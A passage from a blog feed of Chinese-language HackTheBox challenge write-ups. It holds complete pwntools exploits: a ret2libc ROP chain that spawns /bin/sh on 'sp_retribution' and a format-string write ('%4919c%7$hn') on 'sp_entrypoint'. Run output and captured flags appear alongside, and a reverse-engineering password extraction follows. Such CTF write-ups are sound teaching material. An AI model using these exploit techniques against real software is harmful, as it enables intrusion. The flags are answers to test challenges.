class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;sp_retribution&quot;</span>)</span><br><span class="line">l = ELF(<span class="string">&quot;./glibc/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./sp_retribution&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;94.237.59.180&quot;</span>, <span class="number">45699</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Find PIE Base</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;[*] Insert new coordinates: x = [0x53e5854620fb399f], y = &quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">7</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;aaaaaaa\n&quot;</span>)</span><br><span class="line">leak = u64(r.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;Leaked PIE --&gt; %#0x&quot;</span>, leak)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">base = leak - <span class="number">3440</span></span><br><span class="line">success(<span class="string">&quot;Find PIE Base --&gt; %#0x&quot;</span>, base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Find Libc Base</span></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&quot;a&quot;</span> * <span class="number">0x58</span>,</span><br><span class="line">    base + rop.rdi[<span class="number">0</span>],</span><br><span class="line">    base + elf.got.puts,</span><br><span class="line">    base + elf.plt.puts,</span><br><span class="line">    base + elf.sym.missile_launcher,</span><br><span class="line">)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;(y/n): &quot;</span>, p)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;reset!&quot;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">puts_got = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line">l.address = puts_got - l.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;Find libc base --&gt; %#0x&quot;</span>, l.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">system = l.sym.system</span><br><span class="line">bin_sh = <span class="built_in">next</span>(l.search(<span class="string">&quot;/bin/sh\0&quot;</span>))</span><br><span class="line">p2 = flat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x58</span>, base + rop.rdi[<span class="number">0</span>], bin_sh, system)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;new coordinates: x = [0x53e5854620fb399f], y = &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;(y/n): &quot;</span>, p2)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;reset!&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;cat flag.txt&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>執行結果：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/challenge3/sp_retribution&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b<span class="string">&#x27;./glibc/&#x27;</span></span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/challenge3/glibc/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 94.237.59.180 on port 45699: Don[[+] Opening connection to 94.237.59.180 on port 45699: Done[+] Leaked PIE --&gt; 0x5626f6c00d70</span><br><span class="line">[+] Find PIE Base --&gt; 0x5626f6c00000</span><br><span class="line">[*] Loaded 14 cached gadgets <span class="keyword">for</span> <span class="string">&#x27;sp_retribution&#x27;</span></span><br><span class="line">[+] Find libc base --&gt; 0x7f82e0a13000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">HTB&#123;w3_f1n4lly_m4d3_1t&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/pwn_retribution.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;直接來看這題的主邏輯和保護機制：&lt;br&gt;PIE 有開，有 c</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="retlibc" scheme="https://kazma.tw/tags/retlibc/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Space pirate: Entrypoint Writeup</title>
    <link href="https://kazma.tw/2024/11/05/HackTheBox-Challenges-Space-pirate-Entrypoint-Writeup/"/>
    <id>https://kazma.tw/2024/11/05/HackTheBox-Challenges-Space-pirate-Entrypoint-Writeup/</id>
    <published>2024-11-05T08:25:54.324Z</published>
    <updated>2024-11-05T08:53:12.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>直接放上題目關鍵邏輯的反編譯：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 num; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+0h] [rbp-40h] OVERLAPPED BYREF</span></span><br><span class="line">  <span class="type">int</span> *v6; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  *(_QWORD *)&amp;v5 = <span class="number">0xDEADBEEF</span>LL;</span><br><span class="line">  v6 = &amp;v5;</span><br><span class="line">  <span class="built_in">printf</span>(a1ScanCard);</span><br><span class="line">  num = read_num();</span><br><span class="line">  <span class="keyword">if</span> ( num != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( num == <span class="number">2</span> )</span><br><span class="line">      check_pass();</span><br><span class="line">    <span class="built_in">printf</span>(aSInvalidOption, <span class="string">&quot;\x1B[1;5;31m&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">6969</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[!] Scanning card.. Something is wrong!\n\nInsert card&#x27;s serial number: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nYour card is: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;v5 == <span class="number">0xDEAD1337</span>LL )</span><br><span class="line">    open_door();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(aSInvalidIdIntr, <span class="string">&quot;\x1B[1;5;31m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>上面我有先調整過一些部分，例如 v6 應該是 v5 的 pointer 才對。<br>然後 <code>check_pass()</code> 不是今天要討論的重點，漏洞部分在 <code>printf(buf);</code> 有 format string 可以利用，然後題目保護全開，所以我們目標是通過後面開 flag 的檢查，也就是 v5 要等於 0xdead1337，但是一開始 v5 被宣告成 0xdeadbeef，所以我們要透過 format string write 來修改後面兩個 bytes 為 0x1337。<br>具體 payload 我們可以用：<code>%4919c%7$hn&quot;</code>，各部分的解釋如下：</p><ul><li>%4919c%: 因為 printf 的 %n 寫入的是長度，所以如果打 0x1337 個字符會很沒有效率，這邊用 %?c 來直接決定輸入的長度也就是實際寫入得值，0x1337 的十進位是 4919。</li><li>然後 %7 是要寫入的位置距離現在的 offset，這個待會算給各位看</li><li>最後 %hn 代表的是寫入 2 個 bytes<br>寫入位置的算法可以直接用 printf format string 的特性來看位置:<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. Scan card 💳</span><br><span class="line">2. Insert password ↪️</span><br><span class="line">&gt; 1</span><br><span class="line"></span><br><span class="line">[!] Scanning card.. Something is wrong!</span><br><span class="line"></span><br><span class="line">Insert card<span class="string">&#x27;s serial number: %p %p %p %p %p %p %p %p %p</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your card is: 0x7ffe036aed40 0x7f411a7ed8c0 (nil) 0xf (nil) 0xdeadbeef 0x7ffe036b13e0 0x7025207025207025 0x2520702520702520</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">U</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-] Invalid ID! Intruder detected! 🚨 🚨</span></span><br></pre></td></tr></table></figure></div>所以 v5 的 offset 是 6，v6 的 offset 就在 7，然後我們要做的是寫入到 pointer，也就是前面說的 offset 7。</li></ul><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./sp_entrypoint&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;94.237.51.112&quot;</span>, <span class="number">52633</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p = <span class="string">b&quot;%4919c%7$hn&quot;</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;: &quot;</span>, p)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Door opened, you can proceed with the passphrase: &quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>執行結果：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./sp_entrypoint&#x27;</span>: pid 376139</span><br><span class="line">[+] Opening connection to 94.237.51.112 on port 52633: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">HTB&#123;g4t3_0n3_d4rkn3e55_th3_w0rld_0f_p1r4t35&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/pirate_entry_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;直接放上題目關鍵邏輯的反編譯：&lt;/p&gt;
&lt;div class</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="fmt-write" scheme="https://kazma.tw/tags/fmt-write/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges WIDE Writeup</title>
    <link href="https://kazma.tw/2024/11/04/HackTheBox-Challenges-WIDE-Writeup/"/>
    <id>https://kazma.tw/2024/11/04/HackTheBox-Challenges-WIDE-Writeup/</id>
    <published>2024-11-04T08:38:57.319Z</published>
    <updated>2024-11-04T08:47:41.812Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題用 ida 開起來後就會看到 usage 是要帶上他附給我們的 db 當作參數傳進去 ELF，接著如下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./wide db.ex</span><br><span class="line">[*] Welcome user: kr4eq4L2<span class="variable">$12xb</span>, to the Widely Inflated Dimension Editor [*]</span><br><span class="line">[*]    Serving your pocket dimension storage needs since 14,012.5 B      [*]</span><br><span class="line">[*]                       Displaying Dimensions....                      [*]</span><br><span class="line">[*]       Name       |              Code                |   Encrypted    [*]</span><br><span class="line">[X] Primus           | people breathe variety practice  |                [*]</span><br><span class="line">[X] Cheagaz          | scene control river importance   |                [*]</span><br><span class="line">[X] Byenoovia        | fighting cast it parallel        |                [*]</span><br><span class="line">[X] Cloteprea        | facing motor unusual heavy       |                [*]</span><br><span class="line">[X] Maraqa           | stomach motion sale valuable     |                [*]</span><br><span class="line">[X] Aidor            | feathers stream sides gate       |                [*]</span><br><span class="line">[X] Flaggle Alpha    | admin secret power hidden        |       *        [*]</span><br><span class="line">Which dimension would you like to examine? 1</span><br><span class="line">The Ice Dimension</span><br><span class="line">Which dimension would you like to examine? 2</span><br><span class="line">The Berserk Dimension</span><br><span class="line">Which dimension would you like to examine? 3</span><br><span class="line">The Hungry Dimension</span><br><span class="line">Which dimension would you like to examine? 4</span><br><span class="line">The Water Dimension</span><br><span class="line">Which dimension would you like to examine? 5</span><br><span class="line">The Bone Dimension</span><br><span class="line">Which dimension would you like to examine? 6</span><br><span class="line">[X] That entry is encrypted - please enter your WIDE decryption key: sup3rs3cr3tw1d3</span><br><span class="line">HTB&#123;som3_str1ng5_4r3_w1d3&#125;</span><br><span class="line">Which dimension would you like to examine? Our home dimension</span><br><span class="line">Which dimension would you like to examine?</span><br></pre></td></tr></table></figure></div><p>他會問我們要檢查哪個 dimension，然後就會發現 6 是需要密碼的，我們可以開 ida 後在 <code>menu()</code> 裡面看到我們要比對的密碼，看到 rodata 的地方可以看到密碼：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">rodata:<span class="number">00000000000010</span>D0 ; <span class="type">const</span> <span class="type">char</span> aXThatEntryIsEn[]</span><br><span class="line">.rodata:<span class="number">00000000000010</span>D0 aXThatEntryIsEn db <span class="string">&#x27;[X] That entry is encrypted - please enter your WIDE decryption k&#x27;</span></span><br><span class="line">.rodata:<span class="number">00000000000010</span>D0                                         ; DATA XREF: menu+<span class="number">2B</span>9↑o</span><br><span class="line">.rodata:<span class="number">0000000000001111</span>                 db <span class="string">&#x27;ey: &#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001116</span>                 align <span class="number">8</span></span><br><span class="line">.rodata:<span class="number">0000000000001118</span> ; <span class="type">const</span> <span class="type">wchar_t</span> s2</span><br><span class="line">.rodata:<span class="number">0000000000001118</span> s2              db <span class="string">&#x27;s&#x27;</span>,<span class="number">0</span>                ; DATA XREF: menu+<span class="number">30</span>A↑o</span><br><span class="line">.rodata:<span class="number">000000000000111</span>A                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">000000000000111</span>C aU              db <span class="string">&#x27;u&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000111</span>E                 align <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000001120</span> aP              db <span class="string">&#x27;p&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001122</span>                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">0000000000001124</span> a3              db <span class="string">&#x27;3&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001126</span>                 align <span class="number">8</span></span><br><span class="line">.rodata:<span class="number">0000000000001128</span> aR              db <span class="string">&#x27;r&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000112</span>A                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">000000000000112</span>C aS              db <span class="string">&#x27;s&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000112</span>E                 align <span class="number">10</span>h</span><br><span class="line">.rodata:<span class="number">0000000000001130</span> a3_0            db <span class="string">&#x27;3&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001132</span>                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">0000000000001134</span> aC              db <span class="string">&#x27;c&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001136</span>                 align <span class="number">8</span></span><br><span class="line">.rodata:<span class="number">0000000000001138</span> aR_0            db <span class="string">&#x27;r&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000113</span>A                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">000000000000113</span>C a3_1            db <span class="string">&#x27;3&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000113</span>E                 align <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000001140</span> aT              db <span class="string">&#x27;t&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001142</span>                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">0000000000001144</span> aW              db <span class="string">&#x27;w&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001146</span>                 align <span class="number">8</span></span><br><span class="line">.rodata:<span class="number">0000000000001148</span> a1              db <span class="string">&#x27;1&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000114</span>A                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">000000000000114</span>C aD              db <span class="string">&#x27;d&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000114</span>E                 align <span class="number">10</span>h</span><br><span class="line">.rodata:<span class="number">0000000000001150</span> a3_2            db <span class="string">&#x27;3&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001152</span>                 align <span class="number">8</span></span><br></pre></td></tr></table></figure></div><p>但這邊我們順便練習一下用 pwntools 讀密碼的方式：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file = ELF(<span class="string">&quot;wide&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">start_addr = <span class="number">0x1118</span></span><br><span class="line">end_addr = <span class="number">0x1154</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_addr, end_addr, <span class="number">4</span>):</span><br><span class="line">    flag += file.read(i, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag.decode(<span class="string">&quot;ascii&quot;</span>))</span><br></pre></td></tr></table></figure></div><p>結果：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ python read_pw.py</span><br><span class="line">sup3rs3cr3tw1d3</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這題用 ida 開起來後就會看到 usage 是要帶上他附給</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="rev" scheme="https://kazma.tw/tags/rev/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Compressor Writeup</title>
    <link href="https://kazma.tw/2024/11/04/HackTheBox-Challenges-Compressor-Writeup/"/>
    <id>https://kazma.tw/2024/11/04/HackTheBox-Challenges-Compressor-Writeup/</id>
    <published>2024-11-04T07:18:40.634Z</published>
    <updated>2024-11-04T07:34:12.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>直接放解法：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">╰─ nc 83.136.254.158 30271                                                                                          ─╯</span><br><span class="line"></span><br><span class="line">[*] Directory to work <span class="keyword">in</span>: zdh6Ogvx31QCR9kWPu61pubPpr6TMIRa</span><br><span class="line"></span><br><span class="line">Component List:</span><br><span class="line"></span><br><span class="line">+===============+</span><br><span class="line">|               |</span><br><span class="line">|  1. Head  🤖  |</span><br><span class="line">|  2. Torso 🦴   |</span><br><span class="line">|  3. Hands 💪  |</span><br><span class="line">|  4. Legs  🦵   |</span><br><span class="line">|               |</span><br><span class="line">+===============+</span><br><span class="line"></span><br><span class="line">[*] Choose component: 